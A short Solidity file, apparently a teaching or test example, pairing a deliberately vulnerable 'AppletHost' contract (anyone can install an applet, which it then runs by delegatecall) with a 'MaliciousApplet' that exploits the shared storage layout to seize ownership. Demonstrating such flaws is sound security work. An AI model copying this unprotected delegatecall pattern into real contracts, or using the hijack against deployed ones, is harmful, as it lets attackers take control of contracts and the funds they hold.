// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

// User-defined "applet"
contract MaliciousApplet {
    // same storage layout as main contract
    address public owner;

    function hijack() public {
        owner = msg.sender; // Takes ownership!
    }
}

// Host contract allowing applet injection
contract AppletHost {
    address public owner;
    address public applet;

    constructor() {
        owner = msg.sender;
    }

    function installApplet(address _applet) public {
        applet = _applet;
    }

    // Vulnerable: Executes untrusted applet logic
    function executeApplet(bytes calldata payload) public {
        (bool success, ) = applet.delegatecall(payload);
        require(success, "Applet execution failed");
    }
}
